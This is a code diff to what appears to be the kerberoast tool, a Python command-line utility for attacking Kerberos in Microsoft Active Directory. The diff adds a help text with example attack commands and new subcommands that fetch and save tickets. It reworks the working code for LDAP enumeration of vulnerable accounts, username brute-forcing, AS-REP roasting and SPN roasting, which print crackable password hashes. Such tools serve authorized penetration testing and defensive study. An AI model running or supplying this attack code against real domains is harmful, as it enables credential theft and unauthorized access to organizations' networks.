@@ -4,7 +4,7 @@
 #  Tamas Jos (@skelsec)
 #
 
-from msldap.core.msldap import *
+from msldap.core import *
 from msldap.ldap_objects import *
 from msldap import logger as msldaplogger
 
@@ -19,40 +19,36 @@ import getpass
 import os
 import csv
 
-def from_target_string(target):
-	#get domain, username, password
-	domain = None
-	password = None
-	m = target.rfind('@')
-	if m == -1:
-		raise Exception('Failed to find address!')
-	address = target[m+1:]
+kerberoast_epilog = """==== Extra Help ====
+Dump all users from LDAP in a TSV file:
+   - kerberoast ldap full TEST/victim/pw:@10.10.10.2 -o users
 
-	m = target.rfind('@')
-	if m == -1:
-		raise Exception('Could not find username info!')
-	temp = target[:m]
-	m = temp.find('/')
-	if m == -1:
-		domain = None
-	else:
-		domain = temp[:m]
-		temp = temp[m+1:]
+Brute-force guss of usernames via kerberos:
+   - kerberoast brute TEST.corp 10.10.10.2 username_dict.txt
+   
+ASREProast:
+   - kerberoast asreproast 10.10.10.2 -u TEST/srv_http
+   
+Kerberoast (spnroast):
+   - kerberoast spnroast TEST/victim/pass:@10.10.10.2 -u TEST/srv_http
 
-	m = temp.find(':')
-	if m != -1:
-		username = temp[:m]
-		password = temp[m+1:]
-	else:
-		username = temp
+Kerberoast using SSPI (spnroast-sspi):
+   - kerberoast spnroast-sspi -u TEST/srv_http
 
-	return (domain, username, password, address)
-
+Auto (use SSPI for authentication, grabs target users via ldap, peforms spn and asreproast):
+   - kerberoast auto 10.10.10.2
+   
+TGT (get a TGT for given user credential and store it in a CCACHE file):
+   - kerberoast tgt TEST/victim/pass:@10.10.10.2 user.ccache
+   
+TGT (get a TGS for given SPN and store it in a CCACHE file):
+   - kerberoast tgt TEST/victim/pass:@10.10.10.2 TEST/srv_http user.ccache
+"""
 
 def run():
 	import argparse
 
-	parser = argparse.ArgumentParser(description='Tool to perform kerberoast attack against service users in MS Active Directory')
+	parser = argparse.ArgumentParser(description='Tool to perform verious kerberos security tests', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberoast_epilog)
 	parser.add_argument('-v', '--verbose', action='count', default=0, help='Increase verbosity, can be stacked')
 
 
@@ -60,14 +56,12 @@ def run():
 	subparsers.required = True
 	subparsers.dest = 'command'
 
-	ldap_group = subparsers.add_parser('ldap', help='Enumerate potentially vulnerable users via LDAP')
+	ldap_group = subparsers.add_parser('ldap', formatter_class=argparse.RawDescriptionHelpFormatter, help='Enumerate potentially vulnerable users via LDAP', epilog = MSLDAPCredential.help_epilog)
 	ldap_group.add_argument('type', choices=['spn', 'asrep', 'full','custom', 'all'], help='type of vulnerable users to enumerate')
-	ldap_group.add_argument('user',  help='LDAP user specitication <domain>/<username>:<password>@<ip or hostname>')
-	ldap_group.add_argument('-n','--ntlm', action='store_true', help='Indicate if password is actually an NT hash')
+	ldap_group.add_argument('ldap_connection_string',  help='LDAP connection specitication <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname_or_ldap_url>')
 	ldap_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	ldap_group.add_argument('-f','--filter',  help='CUSTOM mode only. LDAP search filter')
 	ldap_group.add_argument('-a','--attrs', action='append', help='FULL and CUSTOM mode only. LDAP attributes to display')
-	ldap_group.add_argument('-s','--use-sspi', action='store_true', help='Use built-in windows SSPI for authentication. No credentials needed, will use the current user context.')
 
 	brute_group = subparsers.add_parser('brute', help='Enumerate users via brute-forcing kerberos service')
 	brute_group.add_argument('realm', help='Kerberos realm <COMPANY.corp>')
@@ -84,12 +78,8 @@ def run():
 	asreproast_group.add_argument('-e','--etype', default=23, const=23, nargs='?', choices= [23, 17, 18], type=int, help = 'Set preferred encryption type')
 
 
-	spnroast_group = subparsers.add_parser('spnroast', help='Perform spn roasting (aka kerberoasting)')
-	spnroast_group.add_argument('logincreds', help='Either CCACHE file name or Kerberos login data <realm>/<username>:<password or NT hash or AES key>@<ip or hostname> Can be omitted for asrep command.')
-	spnroast_group.add_argument('-n','--ntlm', action='store_true', help='Indicate if password is actually an NT hash')
-	spnroast_group.add_argument('-a','--aes', action='store_true',  help='Indicate if password is actually an AES key (AES128 and AES256 agnostic)')
-	spnroast_group.add_argument('-d','--des', action='store_true',  help='Indicate if password is actually an DES key (if DC allows this there are waay more issues than kerberoast)')
-	spnroast_group.add_argument('-c','--ccache', action='store_true',  help='Indicate if target is actually a CCACHE file')
+	spnroast_group = subparsers.add_parser('spnroast', help='Perform spn roasting (aka kerberoasting)',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = KerberosCredential.help_epilog)
+	spnroast_group.add_argument('kerberos_connection_string', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
 	spnroast_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
 	spnroast_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
 	spnroast_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
@@ -101,6 +91,16 @@ def run():
 	spnroastsspi_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
 	spnroastsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	spnroastsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
+	
+	tgt_group = subparsers.add_parser('tgt', help='Fetches a TGT for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = KerberosCredential.help_epilog)
+	tgt_group.add_argument('kerberos_connection_string', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
+	tgt_group.add_argument('out_file',  help='Output CCACHE file')
+	
+	tgs_group = subparsers.add_parser('tgs', help='Fetches a TGT for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = KerberosCredential.help_epilog)
+	tgs_group.add_argument('kerberos_connection_string', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
+	tgs_group.add_argument('spn',  help='SPN strong of the service to get TGS for. Expected format: <domain>/<hostname>')
+	tgs_group.add_argument('out_file',  help='Output CCACHE file')
+	
 
 	auto_group = subparsers.add_parser('auto', help='Just get the tickets already. Only works on windows under any domain-user context')
 	auto_group.add_argument('dc_ip', help='Target domain controller')
@@ -125,28 +125,52 @@ def run():
 
 	#ksoc = KerberosSocket(args.target)
 	
-	if args.command == 'auto':
+	if args.command == 'tgs':
+		cred = KerberosCredential.from_connection_string(args.kerberos_connection_string)			
+		ks = KerberosSocket.from_connection_string(args.kerberos_connection_string)
+		domain, hostname = args.spn.split('/')
+		
+		target = KerberosTarget()
+		target.username = hostname
+		target.domain = domain
+		
+		comm = KerbrosComm(cred, ks)
+		comm.get_TGT()
+		comm.get_TGS(target)
+		comm.ccache.to_file(args.out_file)
+	
+	elif args.command == 'tgt':
+		cred = KerberosCredential.from_connection_string(args.kerberos_connection_string)			
+		ks = KerberosSocket.from_connection_string(args.kerberos_connection_string)
+		comm = KerbrosComm(cred, ks)
+		comm.get_TGT()
+		comm.ccache.to_file(args.out_file)
+		
+	
+	elif args.command == 'auto':
 		try:
 			from winsspi.sspi import KerberoastSSPI
 		except ImportError:
 			raise Exception('winsspi module not installed!')
 			
-		target_server = MSLDAPTargetServer(args.dc_ip)
-		ldap = MSLDAP(None, target_server, use_sspi = True)
-		ldap.connect()
-		adinfo = ldap.get_ad_info()
+		creds = MSLDAPCredential.get_dummy_sspi()
+		target = MSLDAPTarget(args.dc_ip)
+		connection = MSLDAPConnection(creds, target)
+		connection.connect()
+		
+		adinfo = connection.get_ad_info()
 		domain = adinfo.distinguishedName.replace('DC=','').replace(',','.')
 		spn_users = []
 		asrep_users = []
 		results = []
 		errors = []
-		for user in ldap.get_all_knoreq_user_objects():
+		for user in connection.get_all_knoreq_user_objects():
 			cred = KerberosCredential()
 			cred.username = user.sAMAccountName
 			cred.domain = domain
 			
 			asrep_users.append(cred)
-		for user in ldap.get_all_service_user_objects():
+		for user in connection.get_all_service_user_objects():
 			cred = KerberosCredential()
 			cred.username = user.sAMAccountName
 			cred.domain = domain
@@ -310,68 +334,32 @@ def run():
 		logging.debug('Kerberoast loaded %d targets' % len(targets))
 
 
-		if args.ccache:
-			raise Exception('Not implemented yet!')
+		cred = KerberosCredential.from_connection_string(args.kerberos_connection_string)			
+		ks = KerberosSocket.from_connection_string(args.kerberos_connection_string)
+		ar = Kerberoast(cred, ks)
+
+		if args.etype:
+			if args.etype == -1:
+				etypes = [23, 17, 18]
+			else:
+				etypes = [args.etype]
+		else:
+			etypes = [23, 17, 18]
+
+		logging.debug('Kerberoast will suppoort the following encryption type(s): %s' % (','.join(str(x) for x in etypes)))
+
+		hashes = ar.run(targets, override_etype = etypes)
+
+		if args.out_file:
+			with open(args.out_file, 'w') as f:
+				for thash in hashes:
+					f.write(thash + '\r\n')
 
 		else:
-			domain, username, password, target = from_target_string(args.logincreds)
-			if not password:
-				password = getpass.getpass()
+			for thash in hashes:
+				print(thash)
 
-			if not domain:
-				raise Exception('Missing domain from kerberos logon credentials')
-
-			if not username:
-				raise Exception('Missing username from kerberos logon credentials')
-
-			if not target:
-				raise Exception('Missing target from kerberos logon credentials')
-
-
-			cred = KerberosCredential()
-			cred.domain = domain
-			cred.username = username
-
-			if args.ntlm:
-				cred.nt_hash = password
-
-			elif args.aes:
-				if len(password) == 32:
-					cred.kerberos_key_aes_128 = password
-				elif len(password) == 64:
-					cred.kerberos_key_aes_256 = password
-				else:
-					raise Exception('Kerberos logon credential AES keysize incorrect!')
-
-			else:
-				cred.password = password
-
-			ks = KerberosSocket(target)
-			ar = Kerberoast(cred, ks)
-
-			if args.etype:
-				if args.etype == -1:
-					etypes = [23, 17, 18]
-				else:
-					etypes = [args.etype]
-			else:
-				etypes = [23, 17, 18]
-
-			logging.debug('Kerberoast will suppoort the following encryption type(s): %s' % (','.join(str(x) for x in etypes)))
-
-			
-			hashes = ar.run(targets, override_etype = etypes)
-
-			if args.out_file:
-				with open(args.out_file, 'w') as f:
-					for thash in hashes:
-						f.write(thash + '\r\n')
-
-			else:
-				for thash in hashes:
-					print(thash)
-
-			logging.info('Kerberoast complete')
+		logging.info('Kerberoast complete')
 
 
 
@@ -467,14 +455,11 @@ def run():
 	
 
 	elif args.command == 'ldap':
-		domain, username, password, target = from_target_string(args.user)
-		if not password:
-			password = getpass.getpass()
-		ldap_server = MSLDAPTargetServer(target)
-		creds = MSLDAPUserCredential(username = username, domain = domain, password = password, is_ntlm=args.ntlm)
-		ldap = MSLDAP(creds, ldap_server, use_sspi = args.use_sspi)
-		ldap.connect()
-		adinfo = ldap.get_ad_info()
+		creds = MSLDAPCredential.from_connection_string(args.ldap_connection_string)
+		target = MSLDAPTarget.from_connection_string(args.ldap_connection_string)
+		connection = MSLDAPConnection(creds, target)
+		connection.connect()
+		adinfo = connection.get_ad_info()
 		domain = adinfo.distinguishedName.replace('DC=','').replace(',','.')
 
 		if args.out_file:
@@ -486,13 +471,13 @@ def run():
 			cnt = 0
 			if args.out_file:
 				with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
-					for user in ldap.get_all_service_user_objects():
+					for user in connection.get_all_service_user_objects():
 						cnt += 1
 						f.write('%s/%s\r\n' % (domain, user.sAMAccountName))
 			
 			else:
 				print('[+] SPN users')
-				for user in ldap.get_all_service_user_objects():
+				for user in connection.get_all_service_user_objects():
 					cnt += 1
 					print('%s/%s' % (domain, user.sAMAccountName))
 			
@@ -503,12 +488,12 @@ def run():
 			ctr = 0
 			if args.out_file:
 				with open(os.path.join(basefolder,basefile+'_asrep_users.txt'), 'w', newline='') as f:
-					for user in ldap.get_all_knoreq_user_objects():
+					for user in connection.get_all_knoreq_user_objects():
 						ctr += 1
 						f.write('%s/%s\r\n' % (domain, user.sAMAccountName))
 			else:
 				print('[+] ASREP users')
-				for user in ldap.get_all_knoreq_user_objects():
+				for user in connection.get_all_knoreq_user_objects():
 					ctr += 1
 					print('%s/%s' % (domain, user.sAMAccountName))
 
@@ -522,7 +507,7 @@ def run():
 				with open(os.path.join(basefolder,basefile+'_ldap_users.tsv'), 'w', newline='', encoding ='utf8') as f:
 					writer = csv.writer(f, delimiter = '\t')
 					writer.writerow(attrs)
-					for user in ldap.get_all_user_objects():
+					for user in connection.get_all_user_objects():
 						ctr += 1
 						writer.writerow(user.get_row(attrs))
 
@@ -530,7 +515,7 @@ def run():
 				logging.debug('Are you sure about this?')
 				print('[+] Full user dump')
 				print('\t'.join(attrs))
-				for user in ldap.get_all_user_objects():
+				for user in connection.get_all_user_objects():
 					ctr += 1
 					print('\t'.join([str(x) for x in user.get_row(attrs)]))
 
@@ -551,12 +536,12 @@ def run():
 				with open(os.path.join(basefolder,basefile+'_ldap_custom.tsv'), 'w', newline='') as f:
 					writer = csv.writer(f, delimiter = '\t')
 					writer.writerow(args.attrs)
-					for obj in ldap.pagedsearch(self, args.filter, args.attrs):
+					for obj in connection.pagedsearch(self, args.filter, args.attrs):
 						ctr += 1
 						writer.writerow([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs])
 
 			else:
-				for obj in ldap.pagedsearch(self, args.filter, args.attrs):
+				for obj in connection.pagedsearch(self, args.filter, args.attrs):
 					ctr += 1
 					print('\t'.join([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs]))
 
